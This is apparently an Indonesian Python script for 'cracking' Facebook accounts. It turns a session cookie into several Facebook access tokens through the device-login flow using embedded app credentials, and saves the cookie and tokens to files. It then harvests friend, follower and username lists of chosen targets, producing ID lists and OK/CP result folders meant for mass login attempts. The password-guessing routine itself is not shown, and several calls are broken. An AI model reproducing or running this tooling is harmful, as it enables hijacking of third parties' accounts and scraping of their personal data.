# coding=utf-8
# created by Lukmanul Hakim
# facebook ( https://www.facebook.com/arkanbigal.alkan )

#-------------[ INSTALL MODULE ]-------------#
try:
	import rich
except ImportError as e:
	print(f"\n module \x1b[1;92mrich \x1b[0mbelum terinstall, sedang menginstall module mohon tunggu...")
	os.system("pip install rich")
try:
	import requests
except ImportError as e:
	print(f"\n module \x1b[1;92mrequests \x1b[0mbelum terinstall, sedang menginstall module mohon tunggu...")
	os.system("pip install requests")
try:
	import bs4
except ImportError as e:
	print(f"\n module \x1b[1;92mbs4 \x1b[0mbelum terinstall, sedang menginstall module mohon tunggu...")
	os.system("pip install bs4")
try:
	import concurrent.futures
except ImportError as e:
	print(f"\n module \x1b[1;92mfutures \x1b[0mbelum terinstall, sedang menginstall module mohon tunggu...")
	os.system("pip install futures")
	
#-------------[ IMPORT MODULE ]-------------#
import requests, bs4, sys, os, random, time, calendar, re, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime

#-------------[ IMPORT MODULE RICH ]-------------#
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown
from rich.columns import Columns
from rich.console import Console
from rich import print as prints
from rich.panel import Panel

#-------------[ WARNA / COLOUR PRINT ]-------------#
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA DEFAULT

#-------------[ WARNA / COLOUR RICH ]-------------#
M2 = "[#FF0000]" # MERAH
K2 = "[#FFFF00]" # KUNING
U2 = "[#AF00FF]" # UNGU
P2 = "[#FFFFFF]" # PUTIH
H2 = "[#00FF00]" # HIJAU
B2 = "[#00C8FF]" # BIRU
O2 = "[#00FFFF]" # BIRU MUDA

#-------------[ WARNA / COLOUR TEMA ]-------------#
try:
	file = open("data/colour.txt","r").read()
	warna_text = file.split("<=>")[0]
	warna_panel = file.split("<=>")[1]
except:
	warna_text = "[#00C8FF]"
	warna_panel = "#FFFFFF"

#-------------[ GLOBAL NAME ]-------------#
bulan12 = {"01":"januari", "02":"februari", "03":"maret", "04":"april", "05":"mei", "06":"juni", "07":"juli", "08":"agustus", "09":"september", "10":"oktober", "11":"november", "12":"desember"}
sekarang = calendar.timegm(time.gmtime(time.time()))
id, id2, ok, cp, loop = [], [], [], [], 0
uid, urut, external = [], [], []
data, data2 = {}, {}
nom, nama = [], []

#-------------[ BAGIAN JALAN ]-------------#
class Jalan:
	
	#-------------[ KATA BERJALAN ]-------------#
	def jalan(self, keliling):
		for x in keliling + "\n":
			sys.stdout.write(x)
			sys.stdout.flush()
			time.sleep(0.05)
	
#-------------[ BAGIAN LOGO ]-------------#
class Logo:
	
	#-------------[ LOGO ]-------------#
	def banner(self):
		os.system("clear")
		welcome = "# Author : Lukman xd"
		insta = Markdown(welcome, style='green')
		Console().print(insta)
		prints(Panel(f"""[bold]{M2}    ____  __                              __               ______  
   / __ \/ /_  ____  ____ ___  ____ _____/ /___  ____     / __/ /_ 
  / /_/ / __ \/ __ \/ __ `__ \/ __ `/ __  / __ \/ __ \   / /_/ __ \\
 {P2}/ _, _/ / / / /_/ / / / / / / /_/ / /_/ / /_/ / / / /  / __/ /_/ /
/_/ |_/_/ /_/\____/_/ /_/ /_/\__,_/\__,_/\____/_/ /_/  /_/ /_.___/""", padding=(0,4), title=f"[bold]{P2}versions {K2}1.2", style=f"{warna_panel}"))

#-------------[ BAGIAN LOGIN ]-------------#
class Login:
	
	#-------------[ FUNCTION INIT ]-------------#
	def __init__(self):
		self.ses = requests.Session()
		self.url = "https://mbasic.facebook.com"
		self.kota = self.ses.get("http://ipinfo.io/json").json()["city"]
		self.ip_addres = self.ses.get("http://ip-api.com/json/").json()["query"]
		
	#-------------[ PILIH METHODE LOGIN ]-------------#
	def login(self):
		Logo().banner()
		prints(Panel(f"""[bold]{P2}[{warna_text}01{P2}]. login menggunakan cookie v1     [{warna_text}03{P2}]. masuk menu crack no login
[{warna_text}02{P2}]. login menggunakan cookie v2     [{warna_text}04{P2}]. cek akun result crack""", padding=(0,2), title=f"{K2}{self.ip_addres} {P2}| {K2}{self.kota}", style=f"{warna_panel}"))
		bsk = input(f"{P}[+] pilih : {N}")
		if bsk in["1","01"]:
			prints(Panel(f"[bold]{P2}pastikan kamu menggunakan akun tumbal dan bukan akun pribadi", padding=(0,2), style=f"{warna_panel}"))
			kuki = input(f"{P}[+] cookie : {N}")
			tunggu = "# SEDANG MENCONVERT COOKIE MENJADI TOKEN MOHON TUNGGU..."
			proses = Markdown(tunggu, style='green')
			Console().print(proses);time.sleep(5)
			self.token = self.generate_eaam(kuki)
			self.token_eaag = self.generate_eaag(kuki)
			self.token_eaab = self.generate_eaab(kuki)
			self.nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={self.token}", cookies={'cookie':kuki}).json()["name"]
			prints(Panel(f"[bold]{H2}{self.token}", title=f"{P2}token", style=f"{warna_panel}"))
			open("data/cookie.txt","w").write(kuki)
			open("data/token.txt","w").write(self.token)
			open("data/token_eaag.txt","w").write(self.token_eaag)
			open("data/token_eaab.txt","w").write(self.token_eaab)
			self.login_berhasil(self.nama)
		elif bsk in["2","02"]:
			prints(Panel(f"[bold]{P2}pastikan kamu menggunakan akun tumbal dan bukan akun pribadi", padding=(0,2), style=f"{warna_panel}"))
			cookie = input(f"{P}[+] cookie : {N}")
			tunggu = "# SEDANG MENCONVERT COOKIE MENJADI TOKEN MOHON TUNGGU..."
			proses = Markdown(tunggu, style='green')
			Console().print(proses);time.sleep(5)
			self.token = self.generate_eaaj(cookie)
			self.token_eaag = self.generate_eaag(cookie)
			self.token_eaab = self.generate_eaab(cookie)
			self.nama = self.ses.get(f"https://graph.facebook.com/me?fields=name&access_token={self.token}", cookies={'cookie':kuki}).json()["name"]
			prints(Panel(f"[bold]{H2}{self.token}", title=f"{P2}token", style=f"{warna_panel}"))
			open("data/cookie.txt","w").write(cookie)
			open("data/token.txt","w").write(self.token)
			open("data/token_eaag.txt","w").write(self.token_eaag)
			open("data/token_eaab.txt","w").write(self.token_eaab)
			self.login_berhasil(self.nama)
		elif bsk in["3","03"]:
			prints(Panel(f"[bold]{P2}sedang mencoba masuk ke dalam menu crack no login silahkan tunggu...", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(5);Facebook().menu_no_login()
		elif bsk in["4","04"]:Lain().cek_result()
		elif bsk in[""," "]:prints(Panel(f"[bold]{M2}pilih menu untuk melanjutkan jangan isi kosong oky :)", padding=(0,2), style=f"{warna_panel}"));time.sleep(3);sys.exit()
		else:sys.exit()
		
	#-------------[ CONVERT COOKIE KE TOKEN EAAG ]-------------#
	def generate_eaag(self, cookie):
		url = 'https://business.facebook.com/business_locations'
		req = self.ses.get(url,cookies={'cookie':cookie})
		self.token = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
		return self.token
		
	#-------------[ CONVERT COOKIE KE TOKEN EAAB ]-------------#
	def generate_eaab(self, cookie):
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = self.ses.get(url,cookies={'cookie':cookie})
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = self.ses.get(nek,cookies={'cookie':cookie})
		self.token = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		return self.token
		
	#-------------[ CONVERT COOKIE KE TOKEN EAAJ ]-------------#
	def generate_eaaj(self, cookie):
		try:
			url = self.ses.post("https://graph.facebook.com/v16.0/device/login/", data={"access_token": "661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e", "scope": ""}).json()
			kode, user = url["code"], url["user_code"]
			vers = parser(self.ses.get(f"{self.url}/device", cookies={"cookie":cookie}).content, "html.parser")
			for x in vers.find_all("input"):
				if x.get("name") in ["fb_dtsg","jazoest","qr"]:
					aset = {x.get("name"):x.get("value")}
					data.update(aset)
			data.update({"user_code":user})
			meta = parser(self.ses.post(self.url+vers.find("form", method="post").get("action"), data=data, cookies={"cookie":cookie}).text, "html.parser")
			xzxz  = meta.find("form",{"method":"post"})
			for x in xzxz("input",{"value":True}):
				try:
					if x["name"] == "__CANCEL__" : pass
					else:data2.update({x['name']:x['value']})
				except Exception as e: pass
			self.ses.post(f"{self.url}{xzxz['action']}", data=data2, cookies={"cookie":cookie})
			self.token = self.ses.get(f"https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e").json()["access_token"]
		except Exception as e:
			prints(Panel(f"[bold]{M2}cookie akun facebook tumbal kamu invalid atau akun terkena checkpoint", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
		return self.token
			
	#-------------[ CONVERT COOKIE KE TOKEN EAAM ]-------------#
	def generate_eaam(self, cookie):
		try:
			ses.headers.update({'content-type': 'application/x-www-form-urlencoded',})
			data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
			response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
			code, user_code = response['code'], response['user_code']
			verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
			ses.headers.pop('content-type')
			ses.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
			response2 = ses.get(verification_url, cookies = {'cookie':cookie}).text
			if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
				prints(Panel(f"[bold]{M2}cookie akun facebook tumbal kamu invalid atau akun terkena checkpoint", padding=(0,2), style=f"{warna_panel}"))
				time.sleep(3);sys.exit()
			else:
				action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
				data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
				ses.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
				response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie':cookie})
				if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
					ses.headers.pop('content-type');ses.headers.pop('origin')
					response4 = ses.post(response3.url, data = data, cookies = {'cookie':cookie}).text
					action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
					scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
					display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
					user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
					logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
					auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
					encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
					return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
					ses.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
					response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie':cookie}).text
					windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
					ses.headers.pop('content-type');ses.headers.pop('origin')
					ses.headers.update({'referer': 'https://m.facebook.com/',})
					response6 = ses.get(windows_referer, cookies = {'cookie':cookie}).text
					if 'Sukses!' in str(response6):
						ses.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
						response7 = ses.get(status_url, cookies = {'cookie':cookie}).text
						self.token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
		except Exception as e:
			prints(Panel(f"[bold]{M2}cookie akun facebook tumbal kamu invalid atau akun terkena checkpoint", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
		return self.token
		
	#-------------[ LOGIN BERHASIL ]-------------#
	def login_berhasil(self, nama):
		prints(Panel(f"[bold]{P2}selamat {H2}{nama} {P2}login menggunakan cookie berhasil...!", padding=(0,2), style=f"{warna_panel}"))
		Jalan().jalan(f"{P}[•] jalankan ulang perintahnya {H}python premiun.py{N}");time.sleep(2);sys.exit()

#-------------[ BAGIAN MENU FACEBOOK ]-------------#
class Facebook:
	
	#-------------[ FUNCTION INIT ]-------------#
	def __init__(self):
		self.ses = requests.Session()
		self.kota = self.ses.get("http://ipinfo.io/json").json()["city"]
		self.negara = self.ses.get("http://ip-api.com/json/").json()["country"]
		self.ip_addres = self.ses.get("http://ip-api.com/json/").json()["query"]
	
	#-------------[ CEK NAME ID ]-------------#
	def cek_API(self):
		try:self.token = open("data/token.txt","r").read();self.cookie = {"cookie":open("data/cookie.txt","r").read()};self.token_eaab = open("data/token_eaab.txt","r").read()
		except FileNotFoundError:Login().login()
		try:
			url = self.ses.get(f"https://graph.facebook.com/me?fields=name,id,birthday&access_token={self.token}", cookies=self.cookie).json()
			nama, uid, ttl = url["name"], url["id"], url["birthday"]
			m, tanggal, tahun = ttl.split('/')
			bulan = bulan12[m]
			external.append(f"{uid}<=>{nama}<=>{tanggal} {bulan} {tahun}")
		except (ValueError,KeyError):Login().login()
		return Menu().menu()
			
	#-------------[ LIST MENU ]-------------#
	def facebook(self):
		for data in external:
			try:
				self.uid = data.split("<=>")[0]
				self.nama = data.split("<=>")[1]
				self.ttl = data.split("<=>")[2]
			except:pass
		Logo().banner()
		urut.append(Panel(f"[bold]{P2}nama      : {H2}{self.nama}\n{P2}uid fb    : {H2}{self.uid}\n{P2}ttl fb    : {H2}{self.ttl}\n{P2}ip addres : {H2}{self.ip_addres}", width=42, padding=(0,5), title=f"[bold]{P2}data akun", style=f"{warna_panel}"))
		urut.append(Panel(f"[bold]{P2}negara   : {H2}{self.negara}\n{P2}kota     : {H2}{self.kota}\n{P2}status   : {H2}premium\n{P2}joind    : {H2}{sekarang}", width=42, padding=(0,5), title=f"[bold]{P2}data mamu", style=f"{warna_panel}"))
		Console().print(Columns(urut))
		prints(Panel(f"""[bold]{P2}[{warna_text}01{P2}]. crack dari teman publik         [{warna_text}06{P2}]. dump id untuk file
[{warna_text}02{P2}]. crack dari teman massal         [{warna_text}07{P2}]. lihat hasil crack
[{warna_text}03{P2}]. crack dari total pengikut       [{warna_text}08{P2}]. checkpoint dectetor
[{warna_text}04{P2}]. crack dari username             [{warna_text}09{P2}]. report bug script
[{warna_text}05{P2}]. crack dari file                 [{M2}rm{P2}]. keluar + hapus cookie""", padding=(0,4), style=f"{warna_panel}"))
		prints(Panel(f"[bold]{P2}ketik {H2}menu lain {P2}untuk masuk ke dalam menu selanjutnya", padding=(0,6), style=f"{warna_panel}"))

#-------------[ BAGIAN MENU ]-------------#
class Menu:
	
	#-------------[ FUNCTION INIT ]-------------#
	def __init__(self):
		self.ses = requests.Session()
		self.token = open("data/token.txt","r").read()
		self.token_eaag = open("data/token_eaag.txt","r").read()
		self.token_eaab = open("data/token_eaab.txt","r").read()
		self.cookie = {"cookie":open("data/cookie.txt","r").read()}
		
	#-------------[ PILIH MENU ]-------------#
	def menu(self):
		Facebook().facebook()
		asb = input(f"{P}[+] pilih : {N}")
		if asb in["1","01"]:
			prints(Panel(f"[bold]{P2}ketik {O2}'me' {P2}untuk crack dari daftar teman kamu sendiri", padding=(0,2), style=f"{warna_panel}"))
			id = input(f"{P}[+] masukan id atau username : {N}")
			if (re.findall("[a-zA-Z]",str(id))):user = Dump(self.token, self.cookie).convert(id)
			else:user = id
			Dump(self.token, self.token_eaag, self.token_eaab, self.cookie).dump_publik(user)
		elif asb in["2","02"]:
			prints(Panel(f"[bold]{P2}masukan jumlah target yang di inginkan batas maksimal adalah 20", padding=(0,2), style=f"{warna_panel}"))
			jum = int(input(f"{P}[+] crack berapa target : {N}"))
			if jum<1 or jum>20:prints(Panel(f"[bold]{M2}target yang anda masukan sudah melebihi batas maksial yang kami sediakan", padding=(0,2), style=f"{warna_panel}"));sys.exit()
			Dump(self.token, self.token_eaag, self.token_eaab, self.cookie).dump_massal(jum)
		elif asb in["3","03"]:
			prints(Panel(f"[bold]{P2}ketik {O2}'me' {P2}untuk crack dari total pengikut kamu sendiri", padding=(0,2), style=f"{warna_panel}"))
			id = input(f"{P}[+] masukan id atau username : {N}")
			if (re.findall("[a-zA-Z]",str(id))):user = Dump(self.token, self.cookie).convert(id)
			else:user = id
			Dump(self.token, self.token_eaag, self.token_eaab, self.cookie).dump_followers(f"https://graph.facebook.com/{user}/subscribers?limit=1000&access_token={self.token_eaag}")
		elif asb in["4","04"]:
			custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
			custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
			prints(Panel(f"[bold]{P2}masukan username target, gunakan tanda ({H2},{P2}) untuk pemisah lebih dari satu nama", padding=(0,2), style=f"{warna_panel}"))
			nama = input(f"[+] masukan username : ").split(",")
			for ser in nama:
				for belakang in custom:
					nama.append(ser+belakang)
				for depan in custom2:
					nama.append(depan+ser)
			with ThreadPoolExecutor(max_workers=5) as thrud:
				for user in nama:
					thrud.submit(Dump(self.token, self.token_eaag, self.token_eaab, self.cookie).dump_nama,f"https://mbasic.facebook.com/public/{user}?/locale2=id_ID")
		elif asb in["5","05"]:
			prints(Panel(f"[bold]{P2}masukan nama file yang sudah di dump contoh : {H2}/sdcard/dump.txt", padding=(0,2), style=f"{warna_panel}"))
			file = input(f"{P}[+] masukan nama file : ")
			Dump(self.token, self.token_eaag, self.token_eaab, self.cookie).dump_file(file)
			
#-------------[ BAGIAN DUMP ]-------------#
class Dump:
	
	#-------------[ FUNCTION INIT ]-------------#
	def __init__(self, token, token_eaag, token_eaab, cookie):
		self.token = token
		self.cookie = cookie
		self.token_eaag = token_eaag
		self.token_eaab = token_eaab
		self.ses = requests.Session()
	
	#-------------[ CONVERT ]-------------#
	def convert(self, username):
		try:
			req = parser(self.ses.get(f"https://mbasic.facebook.com/{username}", cookies=self.cookie).content, 'html.parser')
			kut = req.find('a',string='Lainnya')
			user = str(kut['href']).split('=')[1].split('&')[0]
			return(user)
		except Exception as e:return(username)
		
	#-------------[ DUMP TEMAN PUBLIK ]-------------#
	def dump_publik(self, user):
		try:
			url = self.ses.get(f"https://graph.facebook.com/v1.0/{user}?fields=friends.limit(5000)&access_token={self.token}",cookies=self.cookie).json()
			for x in url["data"]:
				try:id.append(x["id"]+"<=>"+x["name"])
				except:continue
				print(f"{P}[=] sedang mengumpulkan {H}{len(id)} {P}id {N}", end="\r")
			prints(Panel(f"[bold]{P2}berhasil mengumpulkan {H2}{len(id)} {P2}id", padding=(0,12), style=f"{warna_panel}"))
		except requests.exceptions.ConnectionError:
			prints(Panel(f"[bold]{M2}koneksi internet kamu terganggu atau terputus periksa kembali jaringan nirkabel kamu", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
		except (KeyError,IOError):
			prints(Panel(f"[bold]{M2}id {K2}{user} {P2}tidak publik atau akun target private", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
			
	#-------------[ DUMP TEMAN MASSAL ]-------------#
	def dump_massal(self, jum):
		no=0
		prints(Panel(f"[bold]{P2}ketik {O2}'me' {P2}untuk crack dari daftar teman kamu sendiri", padding=(0,2), style=f"{warna_panel}"))
		for met in range(jum):
			no+=1
			id = input(f"{P}[+] masukan id atau username ke {H}{no} {P}: {N}")
			if (re.findall("[a-zA-Z]",str(id))):user1 = Dump(self.token, self.cookie).convert(id)
			else:user1 = id
			uid.append(user1)
		for user in uid:
			try:
				url = self.ses.get(f"https://graph.facebook.com/v2.0/{user}?fields=friends.limit(5000)&access_token={self.token}", cookies=self.cookie).json()
				for x in url["data"]:
					try:id.append(x["id"]+"<=>"+x["name"])
					except:continue
			except (KeyError,IOError):pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f"[bold]{M2}koneksi internet kamu terganggu atau terputus periksa kembali jaringan nirkabel kamu", padding=(0,2), style=f"{warna_panel}"))
				time.sleep(3);sys.exit()
		try:
			print(f"{P}[=] sedang mengumpulkan {H}{len(id)} {P}id {N}", end="\r")
			prints(Panel(f"[bold]{P2}berhasil mengumpulkan {H2}{len(id)} {P2}id", padding=(0,12), style=f"{warna_panel}"))
		except requests.exceptions.ConnectionError:
			prints(Panel(f"[bold]{M2}koneksi internet kamu terganggu atau terputus periksa kembali jaringan nirkabel kamu", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
		except (KeyError,IOError):
			prints(Panel(f"[bold]{M2}id {K2}{user} {P2}tidak publik atau akun target private", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
	
	#-------------[ DUMP TOTAL PENGIKUT ]-------------#
	def dump_followers(self, link):
		try:
			url = self.ses.get(link, cookies=self.cookie).json()
			for x in url["data"]:
				try:
					try:id.append(x["id"]+"<=>"+x["name"])
					except:continue
					print(f"{P}[=] sedang mengumpulkan {H}{len(id)} {P}id {N}", end="\r")
				except Exception as e: pass
			self.dump_followers(url["paging"]["next"])
		except requests.exceptions.ConnectionError:
			prints(Panel(f"[bold]{M2}koneksi internet kamu terganggu atau terputus periksa kembali jaringan nirkabel kamu", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
		except (KeyError,IOError):
			prints(Panel(f"[bold]{M2}id {K2}{user} {P2}tidak publik atau akun target private", padding=(0,2), style=f"{warna_panel}"))
			time.sleep(3);sys.exit()
	
	#-------------[ DUMP USERNAME ]-------------#
	def dump_nama(self, url):
		link = parser(ses.get(str(url)).text,'html.parser')
		for x in link.find_all('td'):
			data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
			for uid,nama in data:
				if 'profile.php?' in uid:uid = re.findall('id=(.*)',str(uid))[0]
				elif '<span' in nama:nama = re.findall('(.*?)\<',str(nama))[0]
				if uid+"<=>"+nama in id:pass
				else:id.append(uid+"<=>"+nama)
		if (link.find('a',string='Lihat Hasil Selanjutnya').get('href')):self.dump_nama(link.find('a',string='Lihat Hasil Selanjutnya').get('href'))
		else:print("\r")
		
	def dump_file(self, file):
		try:
			user = open(file,"r").readlines()
			for data in user:
				try:user,nama = data.split('|')
				except:prints(Panel(f"[bold]{P2}pemisah file id dan nama salah, anda akan di arahkan ke menu dump id untuk file", padding=(0,2), style=f"{warna_panel}"));time.sleep(5);Lain(self.token, self.cookie).dump_id()
		except:sys.exit()
				
if __name__=="__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Facebook().cek_API()